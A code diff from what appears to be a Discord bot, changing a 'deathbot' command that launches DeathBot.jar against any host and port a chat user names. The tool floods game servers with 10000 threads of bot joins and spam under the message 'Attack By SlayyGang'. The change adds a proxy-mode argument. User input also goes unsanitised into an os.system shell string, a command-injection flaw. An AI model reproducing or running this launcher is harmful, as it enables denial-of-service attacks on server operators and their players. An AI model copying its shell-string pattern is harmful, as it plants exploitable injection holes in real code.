@@ -699,13 +699,13 @@ async def joinmotd(ctx, arg1, arg2):
 
 @client.command()
 
-async def deathbot(ctx, arg1, arg2, arg3):
+async def deathbot(ctx, arg1, arg2, arg3, arg4):
     if arg1 == '1.1.1.1':
         await ctx.send('You cant attack 1.1.1.1')
         pass
     else:
         def attack():
-            os.system(f"java -jar DeathBot.jar -move true -ping true -pingamount 100 -host {arg1} -port {arg2} -threads 10000 -nicksize 16 -stay true -stayl 2000 -nicks RANDOM -spam true -ach true -joinamount 100 -doublej true -protocol 47 -msg 'Attack By SlayyGang' -amount 10 -proxymode NONE -login '/login Test123 ' -register '/register Test123 Test123' -time {arg3} -debug true")
+            os.system(f"java -jar DeathBot.jar -move true -ping false -pingamount 100 -host {arg1} -port {arg2} -threads 10000 -nicksize 16 -stay true -stayl 2000 -nicks RANDOM -spam true -ach true -joinamount 10 -doublej false -protocol 47 -msg 'Attack By SlayyGang' -amount 10 -proxymode {arg4} -login '/login Test123 ' -register '/register Test123 Test123' -time {arg3} -debug true")
             os.system(f"")
 
         embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
